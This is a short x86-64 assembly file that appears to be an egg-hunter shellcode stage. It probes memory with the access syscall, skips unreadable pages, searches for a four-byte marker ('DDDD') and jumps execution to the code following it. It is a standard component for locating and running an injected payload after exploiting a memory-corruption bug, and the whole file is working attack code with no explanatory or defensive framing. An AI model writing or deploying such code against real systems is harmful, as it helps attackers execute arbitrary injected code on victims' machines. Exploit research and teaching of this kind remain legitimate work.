global _start
section .text

syscall.brk equ 12

_start:

    get_brk:
        xor rax, rax
        mov al, syscall.brk
        syscall
        ; rax = address of break (top of the data segment)

        mov r14, rax ; r14 will serve as MAX address value
        xor r8,r8
        dec r8
        shr r8, 1

        xor rsi,rsi
        xor rdi,rdi

next_page:
        or rdi,r8
        inc rdi
        cmp rdi, r14
        jna sys_access
        xor rdi,rdi
        shr r8, 1
        jmp next_page

sys_access:
        push 21
        pop rax
        syscall

check_access:
        cmp al,0xf2
        jz next_page
        mov eax,0x44444443
        inc al
        scasd
        jnz check_access
        jmp rdi
